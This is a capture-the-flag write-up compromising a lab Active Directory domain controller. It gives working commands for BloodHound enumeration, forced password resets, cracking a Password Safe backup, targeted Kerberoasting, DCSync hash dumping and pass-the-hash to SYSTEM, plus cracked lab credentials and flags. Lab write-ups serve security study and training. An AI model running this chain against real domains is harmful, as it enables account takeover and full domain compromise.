
# CTF Writeup: Administrator

---
## Provided Credentials

```
Olivia:ichliebedich
```
## Reconnaissance

An detailled portscan revealed the following information about running services on the target system.

```
nmap -n -Pn -sSCV -p- -oA nmap/administrator 10.129.37.186
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-23 07:30 -0500
Nmap scan report for 10.129.37.186
Host is up (0.019s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-23 19:30:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
54478/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54483/tcp open  msrpc         Microsoft Windows RPC
54502/tcp open  msrpc         Microsoft Windows RPC
54505/tcp open  msrpc         Microsoft Windows RPC
63671/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-23T19:31:45
|_  start_date: N/A
|_clock-skew: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.76 seconds
```

The target seems to be an Domain Controller and we get information about the FQDN DC.administrator.htb, information about the initial domain administrator.htb and the Hostname DC. Let's map them all to the target ip adress in our local dns file.

```
echo "10.129.37.186 DC.administrator.htb administrator.htb DC" | tee -a /etc/hosts
```

Since we are provided credentials I decided to start this time off with preparing BloodHound.

I downloaded all domain information remotely to my local machine using the provided credentials.

```
bloodhound-python -u Olivia -p ichliebedich -ns 10.129.37.186 -d administrator.htb -c all
```

Started up bloodhound & uploaded all domain information.

```
neo4j console
bloodhound
```

Marked user Olivia as owned and found out she has GenericAll on user "Michael".

Before abusing this I wanted to check more stuff. Let's check for ASREP & Kerberoastable users.
Nothing.
Let's create an wordlist for users: users.txt 

```
nxc smb administrator.htb -u Olivia -p ichliebedich --rid-brute > newusers.txt
```

Formatted the wordlist so we can utilize it for nxc spraying.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Enumerated SMB Shares, there seems to be no non-default SMB Shares open.

```
nxc smb administrator.htb -u Olivia -p ichliebedich --shares
```

Checked if we can connect to the target via evil-winrm as user Olivia and yes we can!

```
nxc winrm administrator.htb -u Olivia -p ichliebedich
```

Connected to the target server via evil-winrm.

```
evil-winrm -i administrator.htb -u Olivia -p ichliebedich
```

Before I will change the password of user "Michael" I want to explore the target system a bit.

Let's enumerate it.

Upon inspecting the Users Directory we can see that there seems to be only 4 users active on the DC.

```
Administrator
emily
olivia
Public
```

Alright Enumerating the OS wasn't promising also checking user permissions wasn't. Let's proceed with enumerating FTP.

Access to FTP got denied as anonymous & Olivia user.

Let's change Michael's password!

I'll utilize rpcclient for this and connect as user "Olivia".

```
rpcclient -U "Olivia%ichliebedich" administrator.htb
```

Prompted the following command in order to 

```
setuserinfo2 Michael 23 password123!
```

But checking if he can access FTP was also negative. 

```
nxc ftp administrator.htb -u Michael -p password123!
```

Marked user "MIchael" as owned in BloodHound. He has ForceChangePassword activated for user Benjamin! Let's repeat the process which I did.

```
rpcclient -U 'Michael%password123!' administrator.htb
```

Changed the password for user Benjamin!

```
setuserinfo2 Benjamin 23 password8080
```

Stored the new passwords for user "Michael" & "Benjamin" in my passwords.txt wordlist.

Sprayed with user Benjamin if FTP Auth is enabled now & it is!

```
nxc ftp administrator.htb -u Benjamin -p password8080
```

Logged into FTP.

```
ftp administrator.htb 21
```

There is an interesting "Backup.psafe3" file inside the FTP Share. Let's download it onto our local machine!

```
get Backup.psafe3
```

Enumerate what kind of file format it is. Apparently it is an "Password Safe V3 Database" File.

```
file Backup.psafe3
```

The file seems to be similiar to an .kdbx file. Just for an open-source tool called "pwsafe".

```
pwsafe Backup.psafe3
```

The issue is that we'll need an passphrase. Let's check if there is an tool which converts the file to hash format. So we can bruteforce it! There is! "pwsafe2john".

```
pwsafe2john ../Backup.psafe3 > psafe3_hash
```

Successfully bruteforced an passphrase using john the ripper: tekieromucho

```
john psafe3_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Let's access the database using pwsafe now.

```
pwsafe Backup.psafe3
```

Found 3 account credentials saved:

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

Saved all of the passwords to passwords.txt on my local machine and sprayed auths.

Only emily seems to be working. Since we previously discovered that she has an Users Share on the Domain Controller, let's first verify if she can also connect to the target system via evil-winrm.

```
nxc winrm administrator.htb -u emily -p passwords.txt
```

Yes she can! Let's mark her as owned in BloodHound. She has GenericWrite on user Ethan. Which we can abuse to perform either an targetedKerberoast Attack or Shadow Credential Attack.

Before actually doing so, let's connect to the target system as user emily and checkout if we can retrieve the users.txt flag.

```
evil-winrm -i administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

Retrieved user.txt in C:\Users\emily\Desktop.

```
7859b250eaf4d116ea3d9aa287a28645
```
## Privilege Escalation

Inspected her groups and permissions, but nothing interesting. I'm pretty sure the attack path is to abuse GenericWrite on user Ethan and work from there! Let's do it.

I decided to perform an targeted Kerberoast Attack.

```
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-host DC.administrator.htb --request-user Ethan
```

This error'd out due to Clock Skew Error.

Fixed it by syncing the time of my local attacker machine to the time of the Domain Controller!

```
ntpdate -s administrator.htb
```

Repeated Attack and gained the TGT of user ethan.

```
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-host DC.administrator.htb --request-user Ethan
```

Stored it inside an file "ethan" on my local machine for bruteforcing.

```
hashcat -m 13100 ethan /usr/share/wordlists/rockyou.txt
```

Bruteforced an password for user "ethan" using hashcat.

```
hashcat -m 13100 ethan /usr/share/wordlists/rockyou.txt
```

Gained new credentials.

```
ethan:limpbizkit
```

Marked user "ethan" as owned in BloodHound and found out he has GetChangesAll & GetChanges on the domain "administrator.htb"! Those Policies allow us to perform an DCSync Attack!

Since we got the credentials for Ethan we can utilize the tool secretsdump to Dump Hashes.

```
impacket-secretsdump administrator.htb/Ethan:'limpbizkit'@administrator.htb
```

Connected via psexec as Administrator and gained SYSTEM Shell.

```
impacket-psexec Administrator@administrator.htb -hashes aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
e0dc56a7042ffecadff93c8d40c06b6d
```